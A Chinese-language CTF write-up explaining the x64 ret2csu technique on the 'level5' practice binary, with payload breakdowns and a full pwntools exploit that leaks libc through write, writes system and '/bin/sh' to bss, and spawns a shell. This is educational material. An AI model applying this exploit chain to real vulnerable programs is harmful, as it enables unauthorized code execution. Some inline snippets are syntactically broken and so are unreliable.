---
title: ret2csu
date: 2023-07-11 14:04:22
tags: [Pwn,Stack,ret2csu]
cover: "https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2csucover.jpg"
---





在x64中，在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。这时，我们就要开始考虑通过调用__libc_csu_init函数来实现传递参数的效果，这种实现方式，称为 ret2csu。

------

# 一、介绍

题目链接：https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5/level5

同样参考了yinchen大佬的视频：https://www.bilibili.com/video/BV1K7411a72f/?spm_id_from=333.999.0.0&vd_source=4481f768294d5110af6b9e0ab6a40ddd

视频下面也给出了附件的下载地址：https://pan.baidu.com/s/1GjgyvY9ZBAqjCKRp8j5BoQ （跟题目是一个文件，上面下载不了可以下这个）。

在这里正式感谢一下yinchen大佬，他的视频可以算是我入门 Pwn 的半个引路人了，真的学到很多。视频讲解的非常细致，声音也超级好听。跟着他的视频一步步做下来，给自己增加了很多信心。希望他生活充满阳光，事业一帆风顺！他的b站主页链接：https://space.bilibili.com/24337218

进入正题，将下载好的文件进行反汇编：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2csu/c1.png?x-oss-process=style/watermark"  />

在vulnerable函数中，read函数读取字节超出0x80（可以直接看上面 buf 的位置，bp-80h，就表示距离ebp 0x80个字节，即栈大小0x80），存在溢出漏洞。

按照常规思路，没有找到后门和system函数，且栈不可执行（使用checksec命令可以看文件保护信息，如下图），考虑ret2libc，通过已有函数泄露libc地址。

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2csu/c2.png?x-oss-process=style/watermark"  />

由于是64位文件，我们在溢出时需要pop rdi，ret 的gadget来改变寄存器，使用ROPgadget工具进行寻找：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2csu/c3.png?x-oss-process=style/watermark)

显然，没有可以利用的。此时应该怎么办呢？我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数(当然，不同版本的这个函数有一定的区别)。

反汇编可以看到 __libc_csu_init 函数如下：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2csu/c4.png?x-oss-process=style/watermark)

可以看到在 loc_4005F0 和 loc_400606的位置有一长串操作寄存器的指令，这就是我们要利用的gadgets了。

------

# 二、攻击原理

我们将这两段 gadgets 分别记为 gadgets1（loc_400606） 和gadgets2 （loc_4005F0）。即下面的一段指令为第一段，上面的为第二段。两段的作用如下：

## 2.1 gadgets1

如图所示：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2csu/c5.png?x-oss-process=style/watermark)

第一段gadgets的作用是，将栈中的数据依次移入到rbx、rbp、r12、r13 、r14、r15寄存器，然后将 rsp 寄存器往下移动 0x38 字节。因此正常情况下，汇编指令的作用如下：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2csu/c7.png?x-oss-process=style/watermark)

rsp 原本在栈顶，在将栈中的数据处理完毕后，会将 rsp 寄存器往下移动56个字节，相当于清楚栈空间，这符合我们对栈操作的理解。值得注意的是，为什么[rsp+38h+var_30] 指的是rsp+8的位置呢？其实观察反汇编发现，var_30 的汇编为 -30h，也就是rsp+38h-30h，也就是rsp+8的地方了。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2csu/c8.png?x-oss-process=style/watermark)

## 2.2 gadgets2

如图所示：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2csu/c6.png?x-oss-process=style/watermark)

第二段gadgets的作用是，将 r15 寄存器的内容移到 rbx 寄存器；将r14寄存器的内容移到 rsi 寄存器，将 r13 寄存器的内容移到 edi （rdi）寄存器，然后调用r12+rbx+8 地址处的东西，调用完毕后，将 rbx 加1，然后比较 rbx 和 rbp 的值，若不相等，就跳转到gadget2，即循环执行gadgets2。如果相等就跳出去执行下面的gadget1了。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2csu/c9.png?x-oss-process=style/watermark)

也就是说，如果我们先执行第一段gadgets1，再执行第二段gadgets2，那么我们知识可以控制 6个寄存器后，再让它调用函数，这样一来，只要安排合理，我们可以利用这两段 gadgets 执行许多命令。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2csu/c10.png?x-oss-process=style/watermark)

------

# 三、利用思路

由于程序中既没有system，也没有/bin/sh字符串，都需要自己去构造，思路如下：

1. 利用栈溢出执行 libc_csu_gadgets 获取 write 函数地址，并使得程序重新执行 main 函数
2. 根据 libcsearcher 获取对应 libc 版本以及 execve 函数地址
3. 再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入 system 地址以及 '/bin/sh’ 地址，并使得程序重新执行main 函数。
4. 再次利用栈溢出执行 libc_csu_gadgets 执行 system('/bin/sh') 获取 shell。

## 3.1 泄露write地址

先给出payload：

```py
payload1 =  "\x00"*136 + p64(gadgets1) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) 
payload1 += p64(gadgets2) + "\x00"*56 + p64(main_addr)
```

这段paylod输入后，栈的布局如下：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2csu/c11.png?x-oss-process=style/watermark)

**第一个p64(0)相当于填充数据**。因为调用gadgets1后，rsp就会+8，此时rsp就位于第一个p64(0)的位置。执行call gadgets1时，会依次把参数传给寄存器，。gadget1执行完后，rsp就会转到rsp+0x38的位置，也就是gadget2的位置，此时开始执行gadget2：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2csu/c12.png?x-oss-process=style/watermark)

write 函数原型是 write(1,address,len) ，1表示标准输出流 ，address 是 write 函数要输出信息的地址 ，而 len 表示输出长度。通过gadgets2，write 函数需要的参数刚好被部署好。即wite(1,got_write,8)，也就是将got_wirte的地址打印到屏幕上。然后通过 call(r12+rbx8) 调用write_got地址，执行write函数。write函数执行完毕，回到gadgets2继续执行（add rbx,1），使得下一条cmp比较跳转指令相等，不进行跳转，继续执行下面的指令，也就是 gadgets1（已经利用过，之后怎么样无所谓）。gadgets1 里面有一段 add rsp,38h 所以还要填充 38h 个字节把这一段填充掉，也就是payload里面的 ’00’*56 ，使得gadgets1返回的时候是我们写在栈上的 main_addr。也就是是返回主函数重新执行一遍。

泄露了write函数真实地址后，就可以搜索libc版本，然后通过计算偏移找到system的地址。

```python
libc=LibcSearcher('write',write_addr)
libc_base=write_addr-libc.dump('write')
sys_addr=libc_base+libc.dump('system') 
```

## 3.2 写入system地址和参数

先给出payload：

```python
payload2 =  "\x00"*136 + p64(gadgets1) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16)
payload2 += p64(gadgets2) + "\x00"*56 + p64(main_addr)
```

通过两段gadgets，我们构造了read函数参数并调用，向bss段写入数据。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2csu/c13.png?x-oss-process=style/watermark)

read函数的参数从文件中读取东西放到内存中，第三个参数表示读取长度。read (0,bss_addr,16) 向bss_addr处写入最大16字节的内容。

执行完毕后，我们发送system地址和bin/sh字符串，即将system地址写到bss_addr处，将bin/sh写到bin_addr+8处。

```python
p.send(p64(sys_addr)
p.send("/bin/sh\0")
```

## 3.3 执行system函数

先给出payload：

```
payload3 =  "\x00"*136 + p64(gadgets1) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) +
payload3 += p64(gadgets2) + "\x00"*56 + p64(main_addr)
```

两端gadgets执行如下：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2csu/c14.png?x-oss-process=style/watermark)

即，调用了system('bin/sh')函数，获取shell

完整exp如下：

```python
from pwn import *
elf = ELF('level5')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./level5')

got_write = elf.got['write']
got_read = elf.got['read']
main = 0x400564
bss_addr=0x601028

payload1 =  "\x00"*136
payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) 
payload1 += p64(0x4005F0) + "\x00"*56 + p64(main)#第一段溢出
p.recvuntil("Hello, World\n")
p.send(payload1)

write_addr = u64(p.recv(8)) #接收write打印的内容
print "write_addr: " + hex(write_addr)
off_system_addr = libc.symbols['write'] - libc.symbols['system']#计算偏移
print "off_system_addr: " + hex(off_system_addr)
system_addr = write_addr - off_system_addr #计算system地址
print "system_addr: " + hex(system_addr)

p.recvuntil("Hello, World\n")
payload2 =  "\x00"*136
payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16)
payload2 += p64(0x4005F0) + "\x00"*56 + p64(main) #第二段溢出
p.send(payload2)
sleep(1)
p.send(p64(system_addr))
p.send("/bin/sh\0")
p.recvuntil("Hello, World\n")

payload3 =  "\x00"*136 + p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) + p64(0x4005F0) + "\x00"*56 + p64(main) #第三段溢出
p.send(payload3)
p.interactive()
```

成功获取shell：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2csu/c15.png?x-oss-process=style/watermark)

## 注意：

有些gadgets1的片段是pop，而不是mov：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2csu/c16.png?x-oss-process=style/watermark)

此时注意不需要填充0，寄存器的位置也要注意，此时的溢出应该如下：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2csu/c17.png?x-oss-process=style/watermark)
